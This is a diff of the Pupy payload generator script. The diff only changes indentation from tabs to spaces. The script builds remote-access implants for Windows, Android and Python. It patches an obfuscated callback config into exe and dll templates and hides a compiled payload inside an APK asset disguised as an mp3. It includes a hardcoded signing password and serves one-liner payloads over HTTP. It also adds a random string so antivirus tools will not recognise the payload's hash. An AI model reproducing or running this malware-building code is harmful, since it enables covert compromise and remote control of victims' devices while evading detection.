@@ -14,286 +14,286 @@ from scriptlets.scriptlets import ScriptletArgumentError
 import scriptlets
 
 def get_edit_pupyx86_dll(conf):
-	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
+    return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
 
 def get_edit_pupyx64_dll(conf):
-	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), conf)
+    return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), conf)
 
 def get_edit_pupyx86_exe(conf):
-	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), conf)
+    return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), conf)
 
 def get_edit_pupyx64_exe(conf):
-	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), conf)
+    return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), conf)
 
 def get_edit_binary(path, conf):
-	logging.debug("generating binary %s with conf: %s"%(path, conf))
-	binary=b""
-	with open(path, 'rb') as f:
-		binary=f.read()
-	i=0
-	offsets=[]
-	while True:
-		i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
-		if i==-1:
-			break
-		offsets.append(i)
+    logging.debug("generating binary %s with conf: %s"%(path, conf))
+    binary=b""
+    with open(path, 'rb') as f:
+        binary=f.read()
+    i=0
+    offsets=[]
+    while True:
+        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
+        if i==-1:
+            break
+        offsets.append(i)
 
-	if not offsets:
-		raise Exception("Error: the offset to edit the config have not been found")
-	elif len(offsets)!=1:
-		raise Exception("Error: multiple offsets to edit the config have been found")
+    if not offsets:
+        raise Exception("Error: the offset to edit the config have not been found")
+    elif len(offsets)!=1:
+        raise Exception("Error: multiple offsets to edit the config have been found")
 
-	new_conf=get_raw_conf(conf, obfuscate=True)
-	new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
-	if len(new_conf)>40960-1:
-		raise Exception("Error: config or offline script too long (%s/40960 bytes)\nYou need to recompile the dll with a bigger buffer"%len(new_conf))
-	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
-	return binary
+    new_conf=get_raw_conf(conf, obfuscate=True)
+    new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
+    if len(new_conf)>40960-1:
+        raise Exception("Error: config or offline script too long (%s/40960 bytes)\nYou need to recompile the dll with a bigger buffer"%len(new_conf))
+    binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
+    return binary
 
 def get_raw_conf(conf, obfuscate=False):
-	if not "offline_script" in conf:
-		offline_script=""
-	else:
-		offline_script=conf["offline_script"]
-	new_conf=""
-	obf_func=lambda x:x
-	if obfuscate:
-		obf_func=compress_encode_obfs
+    if not "offline_script" in conf:
+        offline_script=""
+    else:
+        offline_script=conf["offline_script"]
+    new_conf=""
+    obf_func=lambda x:x
+    if obfuscate:
+        obf_func=compress_encode_obfs
 
-	new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
-	new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
-	new_conf+=offline_script
-	new_conf+="\n"
-	
-	return new_conf
+    new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
+    new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
+    new_conf+=offline_script
+    new_conf+="\n"
+    
+    return new_conf
 
 
 def updateZip(zipname, filename, data):
-	# generate a temp file
-	tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
-	os.close(tmpfd)
+    # generate a temp file
+    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
+    os.close(tmpfd)
 
-	# create a temp copy of the archive without filename			
-	with zipfile.ZipFile(zipname, 'r') as zin:
-		with zipfile.ZipFile(tmpname, 'w') as zout:
-			zout.comment = zin.comment # preserve the comment
-			for item in zin.infolist():
-				if item.filename != filename:
-					zout.writestr(item, zin.read(item.filename))
+    # create a temp copy of the archive without filename            
+    with zipfile.ZipFile(zipname, 'r') as zin:
+        with zipfile.ZipFile(tmpname, 'w') as zout:
+            zout.comment = zin.comment # preserve the comment
+            for item in zin.infolist():
+                if item.filename != filename:
+                    zout.writestr(item, zin.read(item.filename))
 
-	# replace with the temp archive
-	os.remove(zipname)
-	os.rename(tmpname, zipname)
+    # replace with the temp archive
+    os.remove(zipname)
+    os.rename(tmpname, zipname)
 
-	# now add filename with its new data
-	with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
-		zf.writestr(filename, data)
+    # now add filename with its new data
+    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(filename, data)
 
 def updateTar(arcpath, arcname, file_path):
-	tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
-	try:
-		with tarfile.open(arcpath, 'r') as tfr:
-			names=tfr.getnames()
-			tfr.extractall(tempdir)
-			with tarfile.open(arcpath+"2", 'w:gz') as tfw:
-				for n in names:
-					#print "adding %s"%n
-					if n!=arcname:
-						tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
-					else:
-						tfw.add(file_path, arcname=n, recursive=False)
-		shutil.copy(arcpath+"2", arcpath)
-	finally:
-		shutil.rmtree(tempdir)
+    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
+    try:
+        with tarfile.open(arcpath, 'r') as tfr:
+            names=tfr.getnames()
+            tfr.extractall(tempdir)
+            with tarfile.open(arcpath+"2", 'w:gz') as tfw:
+                for n in names:
+                    #print "adding %s"%n
+                    if n!=arcname:
+                        tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
+                    else:
+                        tfw.add(file_path, arcname=n, recursive=False)
+        shutil.copy(arcpath+"2", arcpath)
+    finally:
+        shutil.rmtree(tempdir)
 
 def get_edit_apk(path, new_path, conf):
-	tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
-	try:
-		packed_payload=pack_py_payload(get_raw_conf(conf))
-		shutil.copy(path, new_path)
+    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
+    try:
+        packed_payload=pack_py_payload(get_raw_conf(conf))
+        shutil.copy(path, new_path)
 
-		#extracting the python-for-android install tar from the apk
-		zf=zipfile.ZipFile(path,'r')
-		zf.extract("assets/private.mp3", tempdir)
-		zf.close()
+        #extracting the python-for-android install tar from the apk
+        zf=zipfile.ZipFile(path,'r')
+        zf.extract("assets/private.mp3", tempdir)
+        zf.close()
 
-		with open(os.path.join(tempdir,"pp.py"),'w') as w:
-			w.write(packed_payload)
-		import py_compile
-		py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))
+        with open(os.path.join(tempdir,"pp.py"),'w') as w:
+            w.write(packed_payload)
+        import py_compile
+        py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))
 
-		print "[+] packaging the apk ... (can take 10-20 seconds)"
-		#updating the tar with the new config
-		updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
-		#repacking the tar in the apk
-		with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
-			updateZip(new_path, "assets/private.mp3", t.read())
-		
-		#signing the tar
-		try:
-			res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%new_path, shell=True)
-		except OSError as e:
-			if e.errno ==os.errno.ENOENT:
-				print "Please install jarsigner first."
-				sys.exit(1)
-			raise e
-		# -tsa http://timestamp.digicert.com 
-		print(res)
-	finally:
-		#cleaning up
-		shutil.rmtree(tempdir, ignore_errors=True)
+        print "[+] packaging the apk ... (can take 10-20 seconds)"
+        #updating the tar with the new config
+        updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
+        #repacking the tar in the apk
+        with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
+            updateZip(new_path, "assets/private.mp3", t.read())
+        
+        #signing the tar
+        try:
+            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%new_path, shell=True)
+        except OSError as e:
+            if e.errno ==os.errno.ENOENT:
+                print "Please install jarsigner first."
+                sys.exit(1)
+            raise e
+        # -tsa http://timestamp.digicert.com 
+        print(res)
+    finally:
+        #cleaning up
+        shutil.rmtree(tempdir, ignore_errors=True)
 
 def load_scriptlets():
-	scl={}
-	for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
-		if is_pkg:
-			module=loader.find_module(module_name).load_module(module_name)
-			for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
-				if module_name2=="generator":
-					module2=loader2.find_module(module_name2).load_module(module_name2)
-					if not hasattr(module2, 'ScriptletGenerator'):
-						logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
-					else:
-						scl[module_name]=module2.ScriptletGenerator
-	return scl
+    scl={}
+    for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
+        if is_pkg:
+            module=loader.find_module(module_name).load_module(module_name)
+            for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
+                if module_name2=="generator":
+                    module2=loader2.find_module(module_name2).load_module(module_name2)
+                    if not hasattr(module2, 'ScriptletGenerator'):
+                        logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
+                    else:
+                        scl[module_name]=module2.ScriptletGenerator
+    return scl
 
 def parse_scriptlets(args_scriptlet, debug=False):
-	scriptlets_dic=load_scriptlets()
-	sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
-	for sc in args_scriptlet:
-		tab=sc.split(",",1)
-		sc_args={}
-		name=tab[0]
-		if len(tab)==2:
-			try:
-				for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
-					sc_args[x.strip()]=y.strip()
-			except:
-				print("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
-				exit(1)
-				
-		if name not in scriptlets_dic:
-			print(colorize("[-] ","red")+"unknown scriptlet %s, valid choices are : %s"%(repr(name), [x for x in scriptlets_dic.iterkeys()]))
-			exit(1)
-		print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
-		try:
-			sp.add_scriptlet(scriptlets_dic[name](**sc_args))
-		except ScriptletArgumentError as e:
-			print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
-			print("")
-			print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
-			scriptlets_dic[name].print_help()
+    scriptlets_dic=load_scriptlets()
+    sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
+    for sc in args_scriptlet:
+        tab=sc.split(",",1)
+        sc_args={}
+        name=tab[0]
+        if len(tab)==2:
+            try:
+                for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
+                    sc_args[x.strip()]=y.strip()
+            except:
+                print("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
+                exit(1)
+                
+        if name not in scriptlets_dic:
+            print(colorize("[-] ","red")+"unknown scriptlet %s, valid choices are : %s"%(repr(name), [x for x in scriptlets_dic.iterkeys()]))
+            exit(1)
+        print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
+        try:
+            sp.add_scriptlet(scriptlets_dic[name](**sc_args))
+        except ScriptletArgumentError as e:
+            print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
+            print("")
+            print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
+            scriptlets_dic[name].print_help()
 
-			exit(1)
-	script_code=sp.pack()
-	return script_code
+            exit(1)
+    script_code=sp.pack()
+    return script_code
 class ListOptions(argparse.Action):
-	def __call__(self, parser, namespace, values, option_string=None):
-		print "## available formats :"
-		print "- exe_86, exe_x64 : generate PE exe for windows"
-		print "- dll_86, dll_x64 : generate reflective dll for windows"
-		print "- py : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
-		print "- py_oneliner : same as \"py\" format but served over http to load it from a single command line"
-		print ""
-		print "## available scriptlets :"
-		scriptlets_dic=load_scriptlets()
-		for name, sc in scriptlets_dic.iteritems():
-			print "- %s : "%name
-			sc.print_help()
-			print ""
-		exit()
+    def __call__(self, parser, namespace, values, option_string=None):
+        print "## available formats :"
+        print "- exe_86, exe_x64 : generate PE exe for windows"
+        print "- dll_86, dll_x64 : generate reflective dll for windows"
+        print "- py : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
+        print "- py_oneliner : same as \"py\" format but served over http to load it from a single command line"
+        print ""
+        print "## available scriptlets :"
+        scriptlets_dic=load_scriptlets()
+        for name, sc in scriptlets_dic.iteritems():
+            print "- %s : "%name
+            sc.print_help()
+            print ""
+        exit()
 
 PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner']
 if __name__=="__main__":
-	parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
-	parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
-	parser.add_argument('-o', '--output', help="output path")
-	parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
-	parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, scriptlets and options")
-	parser.add_argument('-i', '--interface', default="eth0", help="The default interface to listen on")
-	parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
-	parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
-	parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
-	parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
+    parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
+    parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
+    parser.add_argument('-o', '--output', help="output path")
+    parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
+    parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, scriptlets and options")
+    parser.add_argument('-i', '--interface', default="eth0", help="The default interface to listen on")
+    parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
+    parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
+    parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
+    parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
 
-	args=parser.parse_args()
+    args=parser.parse_args()
 
 
 
-	script_code=""
-	if args.scriptlet:
-		script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
-	
+    script_code=""
+    if args.scriptlet:
+        script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
+    
 
-	l=launchers[args.launcher]()
-	while True:
-		try:
-			l.parse_args(args.launcher_args)
-		except LauncherError as e:
-			if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
-				myip=get_local_ip(args.interface)
-				if not myip:
-					sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
-				print(colorize("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip,"grey"))
-				args.launcher_args.insert(0,"%s:443"%myip)
-				args.launcher_args.insert(0,"--host")
-			else:
-				l.arg_parser.print_usage()
-				exit(str(e))
-		else:
-			break
-	if args.randomize_hash:
-		script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
-	conf={}
-	conf['launcher']=args.launcher
-	conf['launcher_args']=args.launcher_args
-	conf['offline_script']=script_code
+    l=launchers[args.launcher]()
+    while True:
+        try:
+            l.parse_args(args.launcher_args)
+        except LauncherError as e:
+            if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
+                myip=get_local_ip(args.interface)
+                if not myip:
+                    sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
+                print(colorize("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip,"grey"))
+                args.launcher_args.insert(0,"%s:443"%myip)
+                args.launcher_args.insert(0,"--host")
+            else:
+                l.arg_parser.print_usage()
+                exit(str(e))
+        else:
+            break
+    if args.randomize_hash:
+        script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
+    conf={}
+    conf['launcher']=args.launcher
+    conf['launcher_args']=args.launcher_args
+    conf['offline_script']=script_code
 
-	outpath=args.output
-	if args.format=="exe_x86":
-		binary=get_edit_pupyx86_exe(conf)
-		if not outpath:
-			outpath="pupyx86.exe"
-		with open(outpath, 'wb') as w:
-			w.write(binary)
-	elif args.format=="exe_x64":
-		binary=get_edit_pupyx64_exe(conf)
-		if not outpath:
-			outpath="pupyx64.exe"
-		with open(outpath, 'wb') as w:
-			w.write(binary)
-	elif args.format=="dll_x64":
-		binary=get_edit_pupyx64_dll(conf)
-		if not outpath:
-			outpath="pupyx64.dll"
-		with open(outpath, 'wb') as w:
-			w.write(binary)
-	elif args.format=="dll_x86":
-		binary=get_edit_pupyx86_dll(conf)
-		if not outpath:
-			outpath="pupyx86.dll"
-		with open(outpath, 'wb') as w:
-			w.write(binary)
-	elif args.format=="apk":
-		if not outpath:
-			outpath="pupy.apk"
-		get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
-	elif args.format=="py":
-		if not outpath:
-			outpath="payload.py"
-		packed_payload=pack_py_payload(get_raw_conf(conf))
-		with open(outpath, 'wb') as w:
-			w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
-	elif args.format=="py_oneliner":
-		packed_payload=pack_py_payload(get_raw_conf(conf))
-		serve_payload(packed_payload)
-	else:
-		exit("Type %s is invalid."%(args.format))
-	print(colorize("[+] ","green")+"payload successfully generated with config :")
-	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
-	print("LAUNCHER = %s"%repr(args.launcher))
-	print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
-	print("SCRIPTLETS = %s"%args.scriptlet)
+    outpath=args.output
+    if args.format=="exe_x86":
+        binary=get_edit_pupyx86_exe(conf)
+        if not outpath:
+            outpath="pupyx86.exe"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+    elif args.format=="exe_x64":
+        binary=get_edit_pupyx64_exe(conf)
+        if not outpath:
+            outpath="pupyx64.exe"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+    elif args.format=="dll_x64":
+        binary=get_edit_pupyx64_dll(conf)
+        if not outpath:
+            outpath="pupyx64.dll"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+    elif args.format=="dll_x86":
+        binary=get_edit_pupyx86_dll(conf)
+        if not outpath:
+            outpath="pupyx86.dll"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+    elif args.format=="apk":
+        if not outpath:
+            outpath="pupy.apk"
+        get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
+    elif args.format=="py":
+        if not outpath:
+            outpath="payload.py"
+        packed_payload=pack_py_payload(get_raw_conf(conf))
+        with open(outpath, 'wb') as w:
+            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
+    elif args.format=="py_oneliner":
+        packed_payload=pack_py_payload(get_raw_conf(conf))
+        serve_payload(packed_payload)
+    else:
+        exit("Type %s is invalid."%(args.format))
+    print(colorize("[+] ","green")+"payload successfully generated with config :")
+    print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
+    print("LAUNCHER = %s"%repr(args.launcher))
+    print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
+    print("SCRIPTLETS = %s"%args.scriptlet)
 
 
 
